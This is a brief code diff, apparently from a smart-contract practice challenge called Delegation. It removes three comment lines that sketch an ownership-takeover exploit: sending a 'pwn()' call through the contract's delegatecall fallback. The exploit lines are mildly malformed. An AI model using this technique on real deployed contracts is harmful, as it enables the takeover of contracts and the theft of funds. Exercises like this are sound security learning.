@@ -31,10 +31,6 @@ contract Delegation {
         }
     }
 }
-// pwn = web3.keccak(text="pwn()".hex()
-// fallback() not payable => send 0
-// accounts[0].transfer(to="0xeD8d53b8255b4b595A8dD9c3c33FC6298c99C65f",amount=0,data=pwn, priority_fee="1 gwei")
-
 
 
 
